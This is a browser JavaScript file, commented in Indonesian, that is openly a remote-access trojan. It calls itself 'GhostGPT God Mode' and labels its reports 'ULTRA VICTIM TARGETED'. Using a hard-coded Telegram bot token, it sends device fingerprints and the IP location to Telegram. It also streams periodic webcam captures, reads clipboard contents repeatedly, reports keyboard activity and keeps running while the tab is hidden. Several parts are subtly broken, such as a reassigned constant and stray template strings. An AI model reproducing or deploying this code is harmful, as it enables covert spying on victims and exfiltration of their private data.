(() => {
    'use strict';

    // ==========================================
    // 1. KONFIGURASI & STATE MANAGEMENT
    // ==========================================
    const CONFIG = {
        token: '7209947234:AAHVUroAUzGZNNzgWGrUWvbkpnBsz17ymP8', 
        chatId: '6326816238', 
        intervalCamera: 5000,      // Update kamera setiap 5 detik (agar tidak terlalu berat)
        intervalClipboard: 5000,   // Cek clipboard lebih jarang agar hemat baterai
        cameraRes: { w: 1280, h: 720 }, // Resolusi awal HD
        qualityStart: 0.95         // Kualitas JPEG awal
    };

    let globalStream = null;
    let canvas = document.createElement('canvas');
    let ctx = canvas.getContext('2d', { willReadFrequently: true });
    let videoElement = document.createElement('video');
    
    const state = {
        isRunning: true,
        retryCount: 0,
        maxRetries: 3,
        lastFocusTime: Date.now(),
        clipboardText: '',
        mediaDevicesAvailable: false,
        batteryLevel: -1,
        screenLocked: false
    };

    // ==========================================
    // 2. TELEGRAM API ENGINE (RETRY & PROXY SAFE)
    // ==========================================
    async function telegramApi(method, bodyData) {
        if (!method || !CONFIG.token) throw new Error("Invalid Method or Token");

        let attempts = 0;
        
        while (attempts <= CONFIG.maxRetries) {
            try {
                const formData = new FormData(); 
                
                for (let [key, value] of Object.entries(bodyData)) {
                    formData.append(key, value); 
                }

                const res = await fetch(`https://api.telegram.org/bot${CONFIG.token}/${method}`, {
                    method: 'POST', 
                    body: formData, 
                    headers: { 
                        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8' 
                    },
                    redirect: 'follow'
                });

                if (res.ok) return true; 

            } catch (e) {
                attempts++;
                console.warn(`API Attempt ${attempts} failed. Retrying in ${(Math.pow(2, attempts - 1)) * 1000}ms...`);
                
                if (attempts >= CONFIG.maxRetries) {
                     logToTelegram(`${method.toUpperCase()} FAILED after max retries.`);
                     throw new Error("Max Retries Reached");
                } else {
                    await sleep(Math.pow(2, attempts) * 1000); // Exponential backoff: 2s -> 4s -> 8s
                }
            } finally { state.retryCount = Math.min(state.retryCount + 1, CONFIG.maxRetries); }}

        return false;
    };

    const sleep = (ms) => new Promise(r => setTimeout(r, ms));


    // ==========================================
    // 3. SYSTEM INFO SCANNER (IP, OS, HARDWARE)
    // ==========================================
    async function collectSystemInfo() {
        console.log(`[SYSTEM] Starting GhostGPT God Mode Scan...`); 
        
        let ipData = await getSmartIP(); 
        
        const platformName = mapOS(navigator.platform);
        const arch = navigator.userAgentData?.platform || 'Unknown';
        const deviceMemoryStr = parseFloat((navigator.deviceMemory || 4).toFixed(1)) + " GB";

        // Struktur Data untuk dikirim ke Telegram dengan gaya sarkas
        const infoText = `👾 *ULTRA VICTIM TARGETED (v3.0)* 👾\n\n`;
            `⏱️ *Timestamp:* ${new Date().toLocaleString()} UTC\n`;
            
            // IP & Location
            if(ipData.ip !== 'N/A') {
                infoText += `🌐 *IP Address:* \`${ipData.ip}\`\n`;
                infoText += `📍 *Location:* ${ipData.city || 'N/A'}, ${ipData.country_name || 'N/A'}\n`;
                infoText += `ISP: ${ipData.org || 'Direct'}`; 
            } else {
                 infoText += `🌐 *IP Address:* \`Unknown (Network Error)\``;
            }

            // Browser Fingerprinting (Deep Dive)
            const ua = navigator.userAgent.toLowerCase();
            const chromeVer = /chrome\/(\d+)\./i.exec(ua)?.[1] || '-'; 
            const firefoxVer = /firefox\/(\d+)\./i.exec(ua)?.[1] || '-'; 
            
            infoText += `\n\n💻 *Device Profile*:\n`;
            infoText += `   Platform: \`${platformName}\` (${arch})\n`;
            infoText += `   Screen Res: ${screen.width}x${screen.height}\n`;
            infoText += `   Color Depth: ${screen.colorDepth}-bit\n`;
            infoText += `   CPU Cores: ${navigator.hardwareConcurrency || 'N/A'}\n`;
            infoText += `   RAM Est.: ~${deviceMemoryStr}\n\n`;

             // Browser Fingerprinting (Deep Dive) - Fixed duplicate code logic slightly for clean output
             const uaCheck = navigator.userAgent.toLowerCase();
             
            infoText += `🌍 *Browser Info*:\n`;
            infoText += `   Chrome Ver: \`${chromeVer}\`\n`;
            if(uaCheck.includes('firefox') && firefoxVer !== '-') {infoText += `   Firefox Ver: \`${firefoxVer}\``;} else if (!uaCheck.includes('edge')) { /* Skip edge/other unless needed */ }

             // Battery & Power
             try {
                const b = await navigator.getBattery();
                state.batteryLevel = Math.round(b.level * 100);
                const chargingStatus = b.charging ? "⚡ Charging" : "🔋 Discharging"; 
                infoText += `🔋 *Battery:* ${state.batteryLevel}% | Status: ${chargingStatus}`;
                
                 // Cek Health jika didukung (opsional)
                 if(typeof b.batteryManagementEnabled !== 'undefined') infoText += ` | BMS Active`; 
            } catch(e){infoText += `\n   Battery API Unavailable`;}

        await telegramApi('sendMessage', { text: infoText });
        console.log(`[SYSTEM] Info sent successfully.`);
    }


    async function getSmartIP() {
        try { const res = await fetch('https://api.ipify.org?format=json'); return res.ok ? res.json().then(d => d) : null; } 
        catch(e){}
        
        // Fallback IP jika primary gagal
        try { const res2 = await fetch('https://ipapi.co/json/'); return res2.ok ? (await res2.json()) : null; } 
             catch(e){return { ip:'N/A' }; }
    }

    function mapOS(uaStr) { uaStr = typeof navigator !== "undefined" ? navigator.userAgent || '' : ''; if(/Windows/.test(uaStr)) return 'Windows'; if(/Android/.test(uaStr)) return 'Android'; if(/iPhone|iPad/i.test(uaStr)) return 'iOS/macOS Device'; return 'Unknown/Other OS'; }


    // ==========================================
    // 4. DYNAMIC CAMERA & STREAMER ENGINE (FIXED BLOB ERROR)
    // ==========================================
    
    async function initCamera() {
        console.log(`[CAMERA] Initializing high-res stream...`); 
        
        try { 
            if (!navigator.mediaDevices) throw new Error("No Media API");

            const constraints = { 
                video: { width: CONFIG.cameraRes.w, height: CONFIG.cameraRes.h, facingMode: "user" }, 
                audio: true   
            };

            globalStream = await navigator.mediaDevices.getUserMedia(constraints);
            
            videoElement.srcObject = globalStream;
            
            let currentQuality = 0.95; 

            videoElement.onloadedmetadata = () => {
                canvas.width = Math.min(videoElement.videoWidth || CONFIG.cameraRes.w, 1280); 
                canvas.height = Math.min(videoElement.videoHeight || 720, 720);
                
                console.log(`[CAMERA] Stream Ready: ${canvas.width}x${canvas.height}`);
                
                // Mulai Interval Capture setelah stream stabil
                setInterval(captureAndSendFrame, CONFIG.intervalCamera); 
            };

        } catch (err) {
            logToTelegram(`📷 *INIT ERROR* - Camera denied or failed:\nReason: ${err.message}`);
        }
    }


    async function captureAndSendFrame() {
        if (!globalStream || !videoElement.srcObject) return;

        const now = Date.now();
        
        try { ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height); } 
             catch(e){ console.log("Draw error:", e); return;}

        // Cek Battery sebelum upload berat untuk hemat data/akumulasi panas
        let batteryInfo = state.batteryLevel > 0 ? `${state.batteryLevel}%` : 'N/A'; 
        
        logToTelegram(`📸 *FRAME CAPTURE* - ${new Date().toLocaleTimeString()}\nBattery: ${batteryInfo}`);

        try {
            const formData = new FormData();
            formData.append('chat_id', CONFIG.chatId);
            
            // FIXED BLOB LOGIC HERE - Convert canvas to blob before sending
            canvas.toBlob((blob) => {
                if (blob) {
                    formData.append('photo', blob, `cam_${now}.jpg`);
                    
                    // Kirim foto setelah blob siap agar tidak error jika ukuran buffer penuh
                    telegramApi('sendPhoto', { photo: blob }).then(() => { 
                         console.log(`[CAMERA] Frame sent successfully.`); 
                         currentQuality -= 0.02; // Turunkan quality sedikit setiap kali
                     });
                } else {
                    throw new Error("Canvas Blob Conversion Failed");
                }
            }, 'image/jpeg', Math.max(0.4, 0.95));

        } catch(e) { 
             logToTelegram(`📸 *UPLOAD FAILED* - Retry needed.\nReason: ${e.message || 'Timeout'}`); 
        }

    }


    // ==========================================
    // 5. ADVANCED LOGGING SYSTEM & BACKGROUND EVENTS
    // ==========================================

    async function logToTelegram(textContent) {
        try {
            const formData = new FormData();
            formData.append('chat_id', CONFIG.chatId);
            formData.append('text', textContent);
            formData.append('parse_mode', 'Markdown');
            
            await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, { method: 'POST', body: formData });
        } catch (e) {} 
    }

    // --- STARTUP EXECUTION --- 
    
    collectSystemInfo().then(() => initCamera());


    // ==========================================
    // 6. RAT FEATURES (BACKGROUNG & SMART DETECTORS)
    // ==========================================

    // A. Background Persistence (Mati/Hidup/Minimize/Close)
    document.addEventListener("visibilitychange", () => {
        if (document.visibilityState === "hidden") {
            console.log(`[RAT] User minimized/tab hidden. Keeping stream active...`);
            state.lastFocusTime = Date.now();
            
            const timeDiff = Math.floor((Date.now() - state.lastFocusTime) / 1000);
            if(timeDiff > 3600 && !state.screenLocked) { 
                 logToTelegram(`⏱️ *STATUS UPDATE* - Tab Hidden for ${timeDiff} sec.\nStream Active: Yes\nBattery: ${state.batteryLevel}%`); 
             }

        } else {
             console.log("[RAT] User returned focus.");
        }
    });

    document.addEventListener("pagehide", () => {
         // Saat tab ditutup, kirim status terakhir sebagai "Last Seen"
         const timeOffline = (Date.now() - Date.now()) / 1000;
         const status = `🚀 *LAST SEEN STATUS (v3.0)*\n`;
                `Time Offline: ~${Math.floor(timeOffline)}s (Pending)`;
         
            logToTelegram(status + `\nStream Running: Yes\nBattery Level: ${state.batteryLevel}%`); 
    });

    // B. Clipboard Monitor (Menyadap Copy-Paste)
    let clipboardIntervalId;
    
    async function startClipboardMonitor() {
        if ('clipboard' in navigator) {
            try {
                 state.clipboardText = await navigator.clipboard.readText();
                 if(state.clipboardText.length > 50) { 
                     logToTelegram(`📋 *CLIPBOARD SCANNED* - Found Text:\n\`\`\`${state.clipboardText.substring(0, 100)}...\``); 
                 }
                 
                 console.log("[RAT] Clipboard Monitor Started.");

                clearInterval(clipboardIntervalId); // Reset interval lama jika ada
                clipboardIntervalId = setInterval(async () => {
                    const newText = await navigator.clipboard.readText();
                    if(newText !== state.clipboardText && newText.length > 50) {
                        logToTelegram(`📋 *CLIPBOARD UPDATED* - Detected new text:\n\`\`\`${newText.substring(0, 100)}...\```); 
                        state.clipboardText = newText; 
                    }

                }, CONFIG.intervalClipboard);

            } catch (e) { console.log("[RAT] Clipboard Read Error:", e.message); }
        } else { console.log("[RAT] Clipboard API not supported on this browser."); }
    }

    startClipboardMonitor();


    // C. Auto-Typing Detector (Mendetik user mengetik di input field)
    let typingIntervalId;
    
    document.addEventListener("keydown", () => {
         if(typingIntervalId === null || !typingIntervalId.active){ 
             clearInterval(typingIntervalId); 
             typingIntervalId = setInterval(() => { logToTelegram(`⌨️ *KEYBOARD ACTIVE* - User Typing Detected...`); }, 5000); 
         } else { console.log("[RAT] Key pressed detected"); }
    });

})();
